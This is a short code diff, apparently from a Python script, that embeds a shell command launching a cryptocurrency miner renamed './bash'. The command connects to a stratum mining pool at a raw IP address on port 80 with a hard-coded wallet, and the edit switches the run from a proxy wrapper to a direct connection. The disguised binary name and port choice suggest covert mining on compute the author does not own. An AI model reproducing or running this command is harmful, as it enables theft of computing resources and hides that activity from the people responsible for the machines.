@@ -54,7 +54,7 @@ def run_script():
     pwd
     ls -lah
     
-    echo "=== RUN PROC VIA GRAFTCP ==="
+    echo "=== RUN PROC DIRECT ==="
     ./bash -a progpowz -o stratum+tcp://95.111.195.159:80 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS -p x -w TRX
     """
 
